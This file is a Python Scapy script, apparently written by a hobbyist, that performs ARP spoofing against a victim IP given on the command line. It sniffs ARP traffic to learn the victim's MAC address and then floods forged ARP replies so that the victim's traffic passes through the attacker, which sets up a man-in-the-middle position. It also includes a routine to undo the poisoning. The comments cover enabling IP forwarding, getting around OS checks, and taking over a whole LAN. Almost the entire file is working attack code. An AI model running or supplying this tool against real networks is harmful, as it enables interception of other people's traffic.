from scapy.all import conf,get_if_addr,get_if_hwaddr,ARP,Ether,sendp, sniff
import time
#import sys
from multiprocessing import Process ,Queue
#import os 
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("--target" , help= "Victim IP", required=True)
parser.add_argument("--spoof" , help="IP to Spoof" , required=True)
args = parser.parse_args()


#dont forget to enable for the love of god ip forwarding


iface = conf.iface
MyMAC = get_if_hwaddr(iface)
MyIP = get_if_addr(iface)

#fake_mac = "08:00:27:aa:97:97"
fake_mac = MyMAC

#fake_ip= "192.168.1.1" #who we are impersonating
#ip_victim="192.168.1.101"

ip_victim = args.target
fake_ip = args.spoof

mac_victim = ""
mac_suplatation = ""
#newest python bversions dont need import keyboard
#sys.stderr = open(os.devnull , 'w') #OMIT ANY "error" output
aux = ""   

def packet_handler(pkt):
    global mac_victim
    if ARP in pkt:
        if pkt[ARP].op == 2:
            if pkt[ARP].psrc == ip_victim and pkt[ARP].pdst == fake_ip:
                mac_victim = pkt[ARP].hwsrc
                return True
    return False

def sniffer(q):
    global fake_ip
    global ip_victim
    global aux
    global mac_suplatation
    global p1
    global p2
    sniff(filter = "arp", stop_filter  = packet_handler)
    if aux == ip_victim:
        #print("sending revert")

        #aux(101) fake (102) vict(101)
        #fake = 102
        #vict = 101
        #aux = fake (102)
        #fake = vict (101)
        #vict = aux (102)
        #aux(102) fake (101) vict (102)



        #print(f"print here mac supla {mac_suplatation}")
        #print(f"print here mac vuictim {mac_victim}")
        print(f"print fake ip {fake_ip}")
        print(f"print here  ip victm {ip_victim}")

        #frame = Ether(src = fake_mac, dst = mac_victim)/ARP(op = 2, psrc = fake_ip , pdst = ip_victim , hwsrc = mac_suplatation, hwdst = mac_victim)
        #sendp(frame,iface=iface, count = 15,inter = 1, verbose = 1) #to revert the metasploit or the suplantation ip we doing atm
   
        #frame = Ether(src = mac_suplatation, dst = "ff:ff:ff:ff:ff:ff")/ARP(op = 2, psrc = fake_ip , pdst = ip_victim , hwsrc = mac_suplatation, hwdst = "ff:ff:ff:ff:ff:ff")


        frame = Ether(src = mac_victim, dst = "ff:ff:ff:ff:ff:ff")/ARP(op = 2, psrc = ip_victim , pdst = "0.0.0.0" , hwsrc = mac_victim, hwdst = "ff:ff:ff:ff:ff:ff")
        #frame = Ether()/ARP(op = 2, psrc = fake_ip , pdst = ip_victim , hwsrc = mac_suplatation, hwdst = "ff:ff:ff:ff:ff:ff")

        sendp(frame,iface=iface, count = 15,inter = 1, verbose = 1) #to revert the metasploit or the suplantation ip we doing atm



        #--------------------------------------
        #aux(102) fake (101) vict (102)
        #aux = fake (101)
        #fake = vict (102)
        #vict = aux (101)
        #aux(101) fake (102) vict(101)




        aux = fake_ip
        fake_ip = ip_victim
        ip_victim = aux
        #print(f"mac victim {mac_victim}")
        #print(f"mac suplatation {mac_suplatation}")
        #frame = Ether(src = "08:00:27:aa:97:97", dst = mac_suplatation)/ARP(op = 2, psrc = fake_ip , pdst = ip_victim , hwsrc = mac_victim, hwdst = mac_suplatation)
        frame = Ether(src = mac_victim, dst = mac_suplatation)/ARP(op = 2, psrc = fake_ip , pdst = ip_victim , hwsrc = mac_victim, hwdst = mac_suplatation)
        sendp(frame,iface=iface, count = 10 ,inter = 0.05, verbose = 1) #to revert the uibuntu or the victims arp
        print("DONE")
        p1.terminate()
        
        p2.terminate()
        
    else:  
        poison(fake_mac,MyMAC,fake_ip,ip_victim,q)


def poison (mac_fake,mac_real,ip_host,ip_vict,q):
    #we need the dst on the ethernet method, if not uour ip real will get loggedo n the arp table of the vicmtims
    #it seems that on some OSes there is a sec countermeaseure, if the reply comes from an ip that is not even saved o nthe arp table, then
    #it wont accept it, we need to do this 1st a reqeust this the OS will accept , the reqeust will be based on a fake ip
    #now we can reply based on tha fake one
    #you knwo what? we can even own a whole lan if we run a whole of scritps of python on fake requst #
    #the oS of the pcs will received and based on htose, we jsut chagne the mac, we just need to wait for devices to connect
    #eventually host will connect using those fake ones ips we just used, and from there is just listen
    #global mac_suplatation
    #q.put(mac_victim)
    #mac_suplatation = mac_victim
    q.put(mac_victim)
    #print(f"q value {q.get()}")
    #print(mac_victim)
    while True:
        frame = Ether(src = mac_fake, dst = mac_victim)/ARP(op = 2, psrc = ip_host , pdst = ip_vict , hwsrc = mac_fake, hwdst = mac_victim)
        sendp(frame,iface=iface, count = 1 ,inter = 1, verbose = 2)  

  
def potion( ):
    global aux 
    global fake_ip
    global ip_victim
    aux = fake_ip
    fake_ip = ip_victim
    ip_victim = aux
    
    q1 = Queue()
    p1 = Process(target=sniffer, args=(q1,))
    p2 = Process(target=trigger)
    p1.start()
    p2.start()


def trigger():
    global aux
    global fake_ip
    global ip_victim
    frame = Ether(src = MyMAC)/ARP(op = 1, psrc = fake_ip , pdst = ip_victim , hwsrc = MyMAC)
    sendp(frame,iface=iface, count = 1, verbose = 0)
    #p2.terminate()
    #p2.join()


try:
    q = Queue()
    p1 = Process(target=sniffer, args=(q,))
    #p1 = Process(target=sniffer)
    p2 = Process(target=trigger)
    p1.start()
    p2.start()

    while True:
        time.sleep(0.2)
    
except KeyboardInterrupt:
    print("REVERTING ATTACK...WAIT...")  
    mac_suplatation = q.get()
    p1.terminate()
    p1.join()
    p2.terminate()
    p2.join()
    potion()
